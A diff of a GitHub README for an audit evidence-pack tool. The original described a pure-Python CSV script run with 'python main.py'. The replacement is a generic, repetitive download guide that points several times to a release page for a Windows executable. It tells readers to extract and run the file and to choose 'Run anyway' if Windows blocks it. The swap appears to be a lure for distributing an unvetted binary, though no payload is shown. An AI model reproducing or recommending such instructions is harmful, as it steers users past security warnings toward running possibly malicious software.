@@ -1,85 +1,209 @@
-# Evidence Pack Assembler
+# 📦 audit-evidence-pack-assembler - Build cleaner audit evidence packs
 
-A defensive cybersecurity and governance tool that assembles audit and risk evidence packages by framework and control.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/195410211/audit-evidence-pack-assembler/releases)
 
-## Overview
+## 🧭 What this app does
 
-This tool ingests control definitions and evidence records from CSV files, maps evidence to controls, detects stale evidence, identifies missing evidence, and generates comprehensive reports including a Markdown evidence inventory and executive summaries.
+Audit Evidence Pack Assembler helps you organize proof for audit and risk reviews. It groups evidence by framework and control, so you can see what you have, what is stale, and what is missing.
 
-## Features
+Use it to:
+- collect audit files in one place
+- sort proof by framework, control, or topic
+- flag old evidence that may need review
+- map files to controls for faster checking
+- prepare a package for audit, compliance, or risk work
 
-- **CSV Ingestion**: Load control definitions, evidence records, and owner information from CSV files
-- **Data Validation**: Validate required columns, data integrity, and business rules
-- **Evidence Mapping**: Map evidence records to controls by control ID
-- **Staleness Detection**: Identify evidence older than 90 days or missing review dates
-- **Gap Analysis**: Identify controls with missing or draft-only evidence
-- **Reporting**: Generate detailed Markdown reports and terminal summaries
-- **No External Dependencies**: Uses only Python standard library
+## 💻 Before you start
 
-## Sample Data Structure
+You need:
+- a Windows PC
+- an internet connection
+- permission to save files on your computer
+- enough free space for your evidence files and the app
 
-### controls.csv
-```
-framework,control_id,control_title,domain,owner_team,priority
-ISO 27001,A.9.1.1,Access control policy,Access Control,Security Team,High
-NIST CSF,PR.AC-1,Identifies and manages the creation, change, and deletion of user accounts,Access Control,IT Operations,Medium
-```
+The app is built for normal Windows use. Most people run it on Windows 10 or Windows 11.
 
-### evidence.csv
-```
-evidence_id,control_id,evidence_title,evidence_type,file_reference,owner,status,collected_date,review_date,notes
-E001,A.9.1.1,Access Control Policy Document,Policy,docs/policy.pdf,Alice Johnson,valid,2023-01-15,2024-01-15,Annual review completed
-E002,PR.AC-1,User Account Management Procedure,Procedure,docs/procedure.pdf,Bob Smith,stale,2023-06-01,2023-06-01,Needs update
-```
+## 📥 Download the app
 
-### owners.csv
-```
-owner,team,email
-Alice Johnson,Security Team,alice@company.com
-Bob Smith,IT Operations,bob@company.com
-```
+Visit this page to download:
 
-## Risk/Evidence Logic
+[Open the release page](https://github.com/195410211/audit-evidence-pack-assembler/releases)
 
-- **Valid Evidence**: Status = 'valid', review date within 90 days
-- **Stale Evidence**: Review date older than 90 days
-- **At Risk Evidence**: Missing review date
-- **Missing Evidence**: Control has no valid evidence
-- **Draft Evidence**: Status = 'draft', not considered valid
-- **Priority Highlighting**: High-priority controls with missing evidence are flagged
+On that page, look for the latest release. Download the Windows file that matches your device. If you see more than one file, choose the one marked for Windows.
 
-## How to Run
+## 🪟 Install on Windows
 
-1. Ensure Python 3.6+ is installed
-2. Clone or download the project
-3. Place your CSV data files in the `data/` directory
-4. Run the tool:
+After you download the file:
 
-```bash
-python main.py
-```
+1. Open your Downloads folder.
+2. Find the file you just downloaded.
+3. If the file is a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file and double-click it.
+6. If Windows asks for permission, choose Yes or Run.
 
-## Sample Output
+If the release includes an installer file, open that file and follow the steps on screen.
 
-```
-Evidence Pack Assembler Summary:
-Total Controls: 8
-Total Evidence Items: 12
-Missing Evidence Controls: 2
-Stale Evidence Items: 3
-Report generated at: output/evidence_inventory.md
-```
+## ▶️ Run the app
 
-The Markdown report includes summary metrics, executive summary, priority gaps, stale evidence, unknown control mappings, detailed control-to-evidence mapping table, and remediation recommendations.
+When the app opens, follow the on-screen prompts.
 
-## Roadmap
+Typical first-time use:
+1. Pick the folder that holds your audit files.
+2. Choose the framework you want to work with.
+3. Select the controls or evidence groups you need.
+4. Let the app scan your files.
+5. Review the results for stale, missing, and mapped proof.
+6. Export or save the evidence pack.
 
-- [ ] Add support for additional file formats (JSON, Excel)
-- [ ] Implement automated evidence collection from APIs
-- [ ] Add dashboard visualization
-- [ ] Integrate with compliance management platforms
-- [ ] Add configurable staleness thresholds
+## 🗂️ What you can expect to see
 
-## Ethical and Operational Use Note
+The app helps you review your evidence in a simple way. You may see:
+- a list of controls
+- file names linked to each control
+- evidence marked as current or stale
+- missing items that need attention
+- mapped proof that shows where each file belongs
 
-This tool is designed for defensive cybersecurity and governance purposes. Use responsibly and in accordance with applicable laws and organizational policies. Ensure proper authorization before processing sensitive evidence data.
+This makes it easier to prepare for audits and internal reviews.
+
+## 🔎 How the evidence check works
+
+The app scans the files you point it to and compares them with the selected framework or control list.
+
+It can help you:
+- find files that have not changed in a long time
+- spot controls with no matching evidence
+- see where one file supports more than one control
+- keep your package organized across audit cycles
+
+If you update a file, run the scan again so the package reflects the latest version.
+
+## 🧰 Typical use cases
+
+This app fits common audit and GRC work, such as:
+- ISO 27001 evidence review
+- control testing support
+- risk review packs
+- security policy evidence sets
+- governance reporting folders
+- compliance evidence cleanup
+
+It is useful when you need a clear view of proof without sorting every file by hand.
+
+## 📝 Good file habits
+
+For the best results:
+- use clear file names
+- keep one folder for current evidence
+- store old versions in a separate archive folder
+- avoid duplicate copies in many places
+- keep dates in file names when you can
+- update evidence after control changes
+
+Simple file habits make the scan cleaner and the results easier to read.
+
+## ⚙️ Common setup flow
+
+If you are setting up the app for the first time, use this order:
+
+1. Download the latest release.
+2. Open the file on Windows.
+3. Allow the app to run.
+4. Point it to your evidence folder.
+5. Choose your framework or control set.
+6. Review the scan output.
+7. Save the assembled pack where you can find it later.
+
+## 🛡️ Supported work areas
+
+The app is designed for work in:
+- audit
+- compliance
+- cybersecurity
+- evidence management
+- governance
+- GRC
+- risk management
+- security automation
+
+It is a good fit for teams that need to track proof across many controls.
+
+## ❓ If Windows blocks the file
+
+Sometimes Windows may show a security prompt when you open a new app.
+
+If that happens:
+1. Check that you downloaded the file from the release page.
+2. Right-click the file and choose Open.
+3. If Windows asks for approval, choose Run anyway or Yes.
+4. Open the app again from the extracted folder if you used a ZIP file.
+
+## 📁 If your evidence folder is large
+
+If you have many files:
+- start with one folder first
+- use smaller groups by framework or business unit
+- review the scan before adding more files
+- keep archives separate from current proof
+
+This keeps the first run simple and makes it easier to see what the app found.
+
+## 🔄 Updating to a newer version
+
+When a new release appears:
+1. Go to the release page.
+2. Download the newer Windows file.
+3. Close the old app if it is open.
+4. Replace the old version with the new one if needed.
+5. Open the new file and repeat your setup.
+
+Use the newest release when you want the latest control mapping and review behavior.
+
+## 🧪 Example workflow
+
+A simple workflow may look like this:
+1. You collect policy files, screenshots, reports, and exports.
+2. You place them in one evidence folder.
+3. You open the app and choose your framework.
+4. The app checks each file against the controls.
+5. You review stale items and gaps.
+6. You fix missing proof and scan again.
+7. You export the final evidence pack for review.
+
+## 📌 Useful tips
+
+- Keep one version of each key file.
+- Use dates in file names where helpful.
+- Review stale evidence before an audit starts.
+- Store mapped files in a clear folder tree.
+- Re-scan after each major update.
+
+## 🧩 Topic areas
+
+This repository covers:
+- audit
+- compliance
+- cybersecurity
+- evidence management
+- governance
+- GRC
+- ISO 27001
+- Python
+- risk management
+- security automation
+
+## 📦 Download again
+
+Visit the release page to download:
+
+[Open the release page](https://github.com/195410211/audit-evidence-pack-assembler/releases)
+
+## 🖥️ Windows run steps
+
+1. Download the latest release.
+2. Open the file in Windows.
+3. Extract it if it arrives as a ZIP.
+4. Run the app file.
+5. Choose your evidence folder.
+6. Review stale, missing, and mapped proof
